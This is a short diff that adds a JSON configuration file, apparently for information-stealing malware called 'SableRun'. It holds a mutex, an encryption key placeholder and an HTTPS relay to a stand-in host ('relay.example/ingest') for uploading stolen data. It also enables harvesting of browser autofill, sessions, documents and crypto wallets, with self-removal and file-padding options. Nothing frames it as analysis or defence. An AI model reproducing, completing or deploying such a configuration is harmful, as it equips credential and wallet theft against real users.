@@ -1,0 +1,19 @@
+{
+  "schema_version": 1,
+  "mutex": "Global\\SableRun",
+  "seal_key": "k-3f9a-replace-this-with-32-hex-characters",
+  "relay": {
+    "kind": "https",
+    "endpoint": "https://relay.example/ingest"
+  },
+  "sources": {
+    "autofill": true,
+    "documents": true,
+    "wallets": true,
+    "sessions": true,
+    "system": true,
+    "browsers": true
+  },
+  "self_remove": false,
+  "ballast_mb": 0
+}
